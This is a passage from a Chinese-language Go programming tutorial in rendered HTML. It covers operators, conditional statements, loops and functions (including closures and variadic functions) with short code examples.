class="hljs plaintext">a := 5<br>b := 3<br>result := a + b // 结果为 8<br></code></pre></td></tr></table></figure><h3 id="减法运算符"><a href="#减法运算符" class="headerlink" title="减法运算符 -"></a>减法运算符 <code>-</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a - b // 结果为 2<br></code></pre></td></tr></table></figure><h3 id="乘法运算符"><a href="#乘法运算符" class="headerlink" title="乘法运算符 *"></a>乘法运算符 <code>*</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a * b // 结果为 15<br></code></pre></td></tr></table></figure><h3 id="除法运算符"><a href="#除法运算符" class="headerlink" title="除法运算符 /"></a>除法运算符 <code>/</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 10<br>b := 2<br>result := a / b // 结果为 5<br></code></pre></td></tr></table></figure><h3 id="取余运算符"><a href="#取余运算符" class="headerlink" title="取余运算符 %"></a>取余运算符 <code>%</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 10<br>b := 3<br>result := a % b // 结果为 1<br></code></pre></td></tr></table></figure><h2 id="比较运算符"><a href="#比较运算符" class="headerlink" title="比较运算符"></a>比较运算符</h2><h3 id="等于运算符"><a href="#等于运算符" class="headerlink" title="等于运算符 =="></a>等于运算符 <code>==</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 5<br>result := a == b // 结果为 true<br></code></pre></td></tr></table></figure><h3 id="不等于运算符"><a href="#不等于运算符" class="headerlink" title="不等于运算符 !="></a>不等于运算符 <code>!=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a != b // 结果为 true<br></code></pre></td></tr></table></figure><h3 id="大于运算符"><a href="#大于运算符" class="headerlink" title="大于运算符 &gt;"></a>大于运算符 <code>&gt;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a &gt; b // 结果为 true<br></code></pre></td></tr></table></figure><h3 id="小于运算符"><a href="#小于运算符" class="headerlink" title="小于运算符 &lt;"></a>小于运算符 <code>&lt;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a &lt; b // 结果为 false<br></code></pre></td></tr></table></figure><h3 id="大于等于运算符"><a href="#大于等于运算符" class="headerlink" title="大于等于运算符 &gt;="></a>大于等于运算符 <code>&gt;=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 5<br>result := a &gt;= b // 结果为 true<br></code></pre></td></tr></table></figure><h3 id="小于等于运算符"><a href="#小于等于运算符" class="headerlink" title="小于等于运算符 &lt;="></a>小于等于运算符 <code>&lt;=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := 3<br>result := a &lt;= b // 结果为 false<br></code></pre></td></tr></table></figure><h2 id="逻辑运算符"><a href="#逻辑运算符" class="headerlink" title="逻辑运算符"></a>逻辑运算符</h2><h3 id="逻辑与运算符"><a href="#逻辑与运算符" class="headerlink" title="逻辑与运算符 &amp;&amp;"></a>逻辑与运算符 <code>&amp;&amp;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := true<br>b := false<br>result := a &amp;&amp; b // 结果为 false<br></code></pre></td></tr></table></figure><h3 id="逻辑或运算符"><a href="#逻辑或运算符" class="headerlink" title="逻辑或运算符 ||"></a>逻辑或运算符 <code>||</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := true<br>b := false<br>result := a || b // 结果为 true<br></code></pre></td></tr></table></figure><h3 id="逻辑非运算符"><a href="#逻辑非运算符" class="headerlink" title="逻辑非运算符 !"></a>逻辑非运算符 <code>!</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := true<br>result := !a // 结果为 false<br></code></pre></td></tr></table></figure><h2 id="位运算符"><a href="#位运算符" class="headerlink" title="位运算符"></a>位运算符</h2><h3 id="按位与运算符"><a href="#按位与运算符" class="headerlink" title="按位与运算符 &amp;"></a>按位与运算符 <code>&amp;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5 // 二进制：0101<br>b := 3 // 二进制：0011<br>result := a &amp; b // 结果为 1 (二进制：0001)<br></code></pre></td></tr></table></figure><h3 id="按位或运算符"><a href="#按位或运算符" class="headerlink" title="按位或运算符 |"></a>按位或运算符 <code>|</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5 // 二进制：0101<br>b := 3 // 二进制：0011<br>result := a | b // 结果为 7 (二进制：0111)<br></code></pre></td></tr></table></figure><h3 id="按位异或运算符"><a href="#按位异或运算符" class="headerlink" title="按位异或运算符 ^"></a>按位异或运算符 <code>^</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5 // 二进制：0101<br>b := 3 // 二进制：0011<br>result := a ^ b // 结果为 6 (二进制：0110)<br></code></pre></td></tr></table></figure><h3 id="按位左移运算符"><a href="#按位左移运算符" class="headerlink" title="按位左移运算符 &lt;&lt;"></a>按位左移运算符 <code>&lt;&lt;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>result := a &lt;&lt; 2 // 结果为 20<br></code></pre></td></tr></table></figure><h3 id="按位右移运算符"><a href="#按位右移运算符" class="headerlink" title="按位右移运算符 &gt;&gt;"></a>按位右移运算符 <code>&gt;&gt;</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 16<br>result := a &gt;&gt; 2 // 结果为 4<br></code></pre></td></tr></table></figure><h2 id="赋值运算符"><a href="#赋值运算符" class="headerlink" title="赋值运算符"></a>赋值运算符</h2><h3 id="赋值运算符-1"><a href="#赋值运算符-1" class="headerlink" title="赋值运算符 ="></a>赋值运算符 <code>=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>b := a // 将 a 的值赋给 b<br></code></pre></td></tr></table></figure><h3 id="加法赋值运算符"><a href="#加法赋值运算符" class="headerlink" title="加法赋值运算符 +="></a>加法赋值运算符 <code>+=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>a += 3 // 相当于 a = a + 3<br></code></pre></td></tr></table></figure><h3 id="减法赋值运算符"><a href="#减法赋值运算符" class="headerlink" title="减法赋值运算符 -="></a>减法赋值运算符 <code>-=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>a -= 3 // 相当于 a = a - 3<br></code></pre></td></tr></table></figure><h3 id="乘法赋值运算符"><a href="#乘法赋值运算符" class="headerlink" title="乘法赋值运算符 *="></a>乘法赋值运算符 <code>*=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>a *= 3 // 相当于 a = a * 3<br></code></pre></td></tr></table></figure><h3 id="除法赋值运算符"><a href="#除法赋值运算符" class="headerlink" title="除法赋值运算符 /="></a>除法赋值运算符 <code>/=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 10<br>a /= 2 // 相当于 a = a / 2<br></code></pre></td></tr></table></figure><h3 id="取余赋值运算符"><a href="#取余赋值运算符" class="headerlink" title="取余赋值运算符 %="></a>取余赋值运算符 <code>%=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 10<br>a %= 3 // 相当于 a = a % 3<br></code></pre></td></tr></table></figure><h3 id="位运算赋值运算符-和"><a href="#位运算赋值运算符-和" class="headerlink" title="位运算赋值运算符 &amp;=, |= 和 ^="></a>位运算赋值运算符 <code>&amp;=</code>, <code>|=</code> 和 <code>^=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>a &amp;= 3 // 相当于 a = a &amp; 3<br>a |= 3 // 相当于 a = a | 3<br>a ^= 3 // 相当于 a = a ^ 3<br></code></pre></td></tr></table></figure><h3 id="位移赋值运算符"><a href="#位移赋值运算符" class="headerlink" title="位移赋值运算符 &lt;&lt;= 和 &gt;&gt;="></a>位移赋值运算符 <code>&lt;&lt;=</code> 和 <code>&gt;&gt;=</code></h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">a := 5<br>a &lt;&lt;= 2 // 相当于 a = a &lt;&lt; 2<br>a &gt;&gt;= 2 // 相当于 a = a &gt;&gt; 2<br></code></pre></td></tr></table></figure><h1 id="条件语句"><a href="#条件语句" class="headerlink" title="条件语句"></a>条件语句</h1><h2 id="if-语句"><a href="#if-语句" class="headerlink" title="if 语句"></a><code>if</code> 语句</h2><p><code>if</code> 语句用于执行一个代码块，如果指定的条件为真（true）。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if condition &#123;<br>    // 如果条件为真，执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">age := 18<br><br>if age &gt;= 18 &#123;<br>    fmt.Println(&quot;您已经成年了&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="if-else-语句"><a href="#if-else-语句" class="headerlink" title="if-else 语句"></a><code>if-else</code> 语句</h2><p><code>if-else</code> 语句用于执行两个不同的代码块，一个在条件为真时执行，另一个在条件为假时执行。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if condition &#123;<br>    // 如果条件为真，执行这里的代码<br>&#125; else &#123;<br>    // 如果条件为假，执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">age := 16<br><br>if age &gt;= 18 &#123;<br>    fmt.Println(&quot;您已经成年了&quot;)<br>&#125; else &#123;<br>    fmt.Println(&quot;您还未成年&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="if-else-if-else-语句"><a href="#if-else-if-else-语句" class="headerlink" title="if-else if-else 语句"></a><code>if-else if-else</code> 语句</h2><p><code>if-else if-else</code> 语句用于执行多个不同的代码块，根据多个条件进行选择。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">if condition1 &#123;<br>    // 如果条件1为真，执行这里的代码<br>&#125; else if condition2 &#123;<br>    // 如果条件2为真，执行这里的代码<br>&#125; else &#123;<br>    // 如果以上条件都不满足，执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">score := 85<br><br>if score &gt;= 90 &#123;<br>    fmt.Println(&quot;成绩优秀&quot;)<br>&#125; else if score &gt;= 70 &#123;<br>    fmt.Println(&quot;成绩良好&quot;)<br>&#125; else &#123;<br>    fmt.Println(&quot;成绩不及格&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="条件语句的嵌套"><a href="#条件语句的嵌套" class="headerlink" title="条件语句的嵌套"></a>条件语句的嵌套</h2><p>条件语句可以嵌套在其他条件语句内部，以实现更复杂的逻辑。</p><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">age := 25<br>isStudent := false<br><br>if age &gt;= 18 &#123;<br>    if isStudent &#123;<br>        fmt.Println(&quot;您是成年学生&quot;)<br>    &#125; else &#123;<br>        fmt.Println(&quot;您是成年工作人员&quot;)<br>    &#125;<br>&#125; else &#123;<br>    fmt.Println(&quot;您还未成年&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="switch-语句"><a href="#switch-语句" class="headerlink" title="switch 语句"></a><code>switch</code> 语句</h2><p><code>switch</code> 语句用于根据表达式的值执行不同的代码块。它可以替代多个 <code>if-else if-else</code> 语句。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">switch expression &#123;<br>case value1:<br>    // 当表达式等于 value1 时执行<br>case value2:<br>    // 当表达式等于 value2 时执行<br>default:<br>    // 如果没有匹配的情况，执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">day := &quot;Monday&quot;<br><br>switch day &#123;<br>case &quot;Monday&quot;:<br>    fmt.Println(&quot;星期一&quot;)<br>case &quot;Tuesday&quot;:<br>    fmt.Println(&quot;星期二&quot;)<br>default:<br>    fmt.Println(&quot;其他天&quot;)<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="循环语句"><a href="#循环语句" class="headerlink" title="循环语句"></a>循环语句</h1><h2 id="for-循环"><a href="#for-循环" class="headerlink" title="for 循环"></a><code>for</code> 循环</h2><p><code>for</code> 循环是Golang中最常用的循环语句，它允许你重复执行一段代码，直到指定的条件不再满足。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for initialization; condition; increment &#123;<br>    // 在条件为真时执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>initialization</code>：初始化语句，通常用于初始化循环计数器。</li><li><code>condition</code>：循环的终止条件，当条件为假时循环结束。</li><li><code>increment</code>：迭代表达式，用于更新循环计数器。</li></ul><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for i := 0; i &lt; 5; i++ &#123;<br>    fmt.Println(i) // 打印循环计数器的值<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="while-循环"><a href="#while-循环" class="headerlink" title="while 循环"></a><code>while</code> 循环</h2><p><code>while</code> 循环用于在满足条件的情况下重复执行一段代码，条件在循环开始前检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for condition &#123;<br>    // 在条件为真时执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>condition</code>：循环的条件，当条件为真时循环继续执行。</li></ul><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">count := 0<br>for count &lt; 5 &#123;<br>    fmt.Println(count) // 打印计数器的值<br>    count++<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="do-while-循环"><a href="#do-while-循环" class="headerlink" title="do-while 循环"></a><code>do-while</code> 循环</h2><p><code>do-while</code> 循环用于在满足条件的情况下重复执行一段代码，条件在循环结束后检查。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for &#123;<br>    // 执行这里的代码<br>    if !condition &#123;<br>        break // 当条件不满足时终止循环<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>condition</code>：循环的条件，当条件不再满足时循环终止。</li></ul><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">count := 0<br>for &#123;<br>    fmt.Println(count) // 打印计数器的值<br>    count++<br>    if count &gt;= 5 &#123;<br>        break // 当计数器达到 5 时终止循环<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="range-循环"><a href="#range-循环" class="headerlink" title="range 循环"></a><code>range</code> 循环</h2><p><code>range</code> 循环用于迭代数组、切片、映射和通道等数据结构的元素。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for index, value := range collection &#123;<br>    // 在每次迭代时执行这里的代码<br>&#125;<br></code></pre></td></tr></table></figure><ul><li><code>index</code>：元素的索引（对于切片和数组）或键（对于映射）。</li><li><code>value</code>：元素的值。</li></ul><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">numbers := []int&#123;1, 2, 3, 4, 5&#125;<br>for index, value := range numbers &#123;<br>    fmt.Printf(&quot;Index: %d, Value: %d\n&quot;, index, value) // 打印索引和值<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="break-和-continue"><a href="#break-和-continue" class="headerlink" title="break 和 continue"></a><code>break</code> 和 <code>continue</code></h2><p>在循环中，<code>break</code> 语句用于立即终止循环，而 <code>continue</code> 语句用于跳过当前迭代并进入下一次迭代。</p><p><strong>示例：</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">for i := 0; i &lt; 5; i++ &#123;<br>    if i == 2 &#123;<br>        continue // 跳过 i 等于 2 的情况<br>    &#125;<br>    fmt.Println(i) // 打印循环计数器的值<br>    if i == 3 &#123;<br>        break // 终止循环<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><h1 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h1><h2 id="函数定义"><a href="#函数定义" class="headerlink" title="函数定义"></a>函数定义</h2><p>函数是一种用于执行特定任务的代码块。在Golang中，函数的定义如下：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个函数，函数名为 functionName<br>// 参数列表为空，返回值为空<br>func functionName() &#123;<br>    // 函数体<br>    // 这里可以包含一系列的语句<br>    // 但在这个示例中，函数体为空<br>&#125;<br></code></pre></td></tr></table></figure><h2 id="函数示例"><a href="#函数示例" class="headerlink" title="函数示例"></a>函数示例</h2><h3 id="无参数，无返回值的函数"><a href="#无参数，无返回值的函数" class="headerlink" title="无参数，无返回值的函数"></a>无参数，无返回值的函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个无参数、无返回值的函数 sayHello<br>func sayHello() &#123;<br>    // 在函数内部，打印一条消息<br>    fmt.Println(&quot;Hello, World!&quot;)<br>&#125;<br><br>// 调用函数 sayHello<br>sayHello() <br></code></pre></td></tr></table></figure><h3 id="带参数，无返回值的函数"><a href="#带参数，无返回值的函数" class="headerlink" title="带参数，无返回值的函数"></a>带参数，无返回值的函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">func greet(name string) &#123;<br>    fmt.Printf(&quot;Hello, %s!\n&quot;, name)<br>&#125;<br><br>greet(&quot;Alice&quot;) // 调用函数<br></code></pre></td></tr></table></figure><h3 id="带参数，带返回值的函数"><a href="#带参数，带返回值的函数" class="headerlink" title="带参数，带返回值的函数"></a>带参数，带返回值的函数</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个带两个整数参数和一个整数返回值的函数 add<br>func add(a, b int) int &#123;<br>    // 在函数内部，计算参数 a 和 b 的和，并返回结果<br>    return a + b<br>&#125;<br><br>// 调用函数 add，并接收返回值并存储在 result 变量中<br>result := add(3, 5)<br></code></pre></td></tr></table></figure><h2 id="多返回值的函数"><a href="#多返回值的函数" class="headerlink" title="多返回值的函数"></a>多返回值的函数</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个带两个整数参数的函数 divide 和两个整数返回值<br>func divide(a, b int) (int, int) &#123;<br>    // 在函数内部，计算商和余数，并返回两个值<br>    quotient := a / b<br>    remainder := a % b<br>    return quotient, remainder<br>&#125;<br><br>// 调用函数 divide，并接收两个返回值<br>q, r := divide(10, 3)<br></code></pre></td></tr></table></figure><h2 id="匿名函数"><a href="#匿名函数" class="headerlink" title="匿名函数"></a>匿名函数</h2><p>可以在函数内定义匿名函数，然后将其分配给变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 创建一个匿名函数，并将其分配给变量 add<br>add := func(a, b int) int &#123;<br>    // 在匿名函数内部，计算参数 a 和 b 的和，并返回结果<br>    return a + b<br>&#125;<br><br>// 调用匿名函数并存储结果在 result 变量中<br>result := add(3, 5)<br></code></pre></td></tr></table></figure><h2 id="函数作为参数"><a href="#函数作为参数" class="headerlink" title="函数作为参数"></a>函数作为参数</h2><p>函数可以作为参数传递给其他函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个函数 operate，接受两个整数参数和一个函数参数 operation<br>// 函数参数 operation 的类型是一个接受两个整数并返回一个整数的函数<br>func operate(a, b int, operation func(int, int) int) int &#123;<br>    // 在函数内部，调用传递进来的函数 operation，并将其结果返回<br>    return operation(a, b)<br>&#125;<br><br>// 定义一个函数 add，用于将两个整数相加<br>add := func(a, b int) int &#123;<br>    // 在 add 函数内部，计算参数 a 和 b 的和，并返回结果<br>    return a + b<br>&#125;<br><br>// 调用 operate 函数，传递参数 3 和 5，以及函数参数 add，并接收返回值<br>result := operate(3, 5, add)<br></code></pre></td></tr></table></figure><h2 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h2><p>闭包是一个函数，它可以访问其外部函数范围内的变量。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个函数 counter，它返回一个函数<br>func counter() func() int &#123;<br>    // 在 counter 函数内部，定义一个局部变量 count<br>    count := 0<br>    // 返回一个匿名函数，它可以访问 count 变量<br>    return func() int &#123;<br>        count++<br>        return count<br>    &#125;<br>&#125;<br><br>// 调用 counter 函数并将返回的函数存储在变量 c 中<br>c := counter()<br>// 调用 c 函数两次，每次调用都会递增 count 变量并返回新的值<br>fmt.Println(c()) // 输出 1<br>fmt.Println(c()) // 输出 2<br></code></pre></td></tr></table></figure><h2 id="可变参数函数"><a href="#可变参数函数" class="headerlink" title="可变参数函数"></a>可变参数函数</h2><p>Golang允许定义接受可变数量参数的函数。</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">// 定义一个函数 sum，接受任意数量的整数参数，并返回它们的和<br>func sum(nums ...int) int &#123;<br>    // 定义一个变量 total 用于存储和<br>    total := 0<br>    // 使用 range 迭代参数列表中的整数，并累加到 total 中<br>    for _, num := range nums &#123;<br>        total += num<br>    &#125;<br>    // 返回计算的总和<br>    return total<br>&#125;<br><br>// 调用 sum 函数，传递不定数量的整数参数，并接收返回值<br>result := sum(1, 2, 3, 4, 5)<br></code></pre></td></tr></table></figure><h1 id="结构体"><a 